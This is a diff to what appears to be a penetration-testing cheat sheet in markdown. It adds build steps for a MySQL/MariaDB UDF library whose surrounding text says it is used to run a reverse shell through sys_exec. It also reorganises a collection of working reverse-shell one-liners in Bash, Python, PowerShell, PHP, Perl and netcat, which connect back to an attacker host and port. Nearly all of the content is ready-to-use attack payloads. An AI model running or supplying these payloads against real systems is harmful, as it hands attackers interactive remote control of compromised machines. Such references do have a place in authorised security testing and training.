@@ -1364,10 +1364,17 @@ $ sudo apt install libmariadbclient-dev -y
 $ git clone https://github.com/mysqludf/lib_mysqludf_sys && cd lib_mysqludf_sys
 ```
 
-Compile `.so` library (x86_64 MariaDB example):
+Compile `.so` library (x86 example):
 
 ```
-$ gcc lib_mysqludf_sys_x64.c -o lib_mysqludf_sys_x64.so -m64 -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
+$ sudo apt install libc6-dev-i386 -y
+$ gcc lib_mysqludf_sys.c -o lib_mysqludf_sys_x86.so -m32 -Wl,--hash-style=both -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
+```
+
+Compile `.so` library (x86_64 example):
+
+```
+$ gcc lib_mysqludf_sys.c -o lib_mysqludf_sys_x64.so -m64 -Wl,--hash-style=both -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
 ```
 
 Load library and call user-defined `sys_exec` function with a rev-shell.
@@ -5814,18 +5821,9 @@ $ wmiexec.py -nooutput snovvcrash:'Passw0rd!'@10.10.13.38 "powershell IEX(New-Ob
 
 ## Bash
 
-```
-$ /bin/bash -c '/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
-$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
-```
-
-
-
-
-## Netcat
-
-```
-$ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
+```bash
+/bin/bash -c '/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
 ```
 
 
@@ -5837,18 +5835,18 @@ $ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
 
 ### IPv4
 
-```
-$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
-$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()
 ```
 
 
 
 ### IPv6
 
-```
-$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
-$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()
+import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()
 ```
 
 
@@ -5860,6 +5858,33 @@ System.Net.Sockets.TCPClient:
 
 ```
 $client = New-Object System.Net.Sockets.TCPClient("10.10.13.37",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..49152|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+
+
+
+## PHP
+
+```php
+<?php echo passthru("/bin/bash -c '/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"); ?>
+```
+
+
+
+
+## Perl
+
+```
+use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
+```
+
+
+
+
+## Netcat
+
+```
+$ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
 ```
 
 
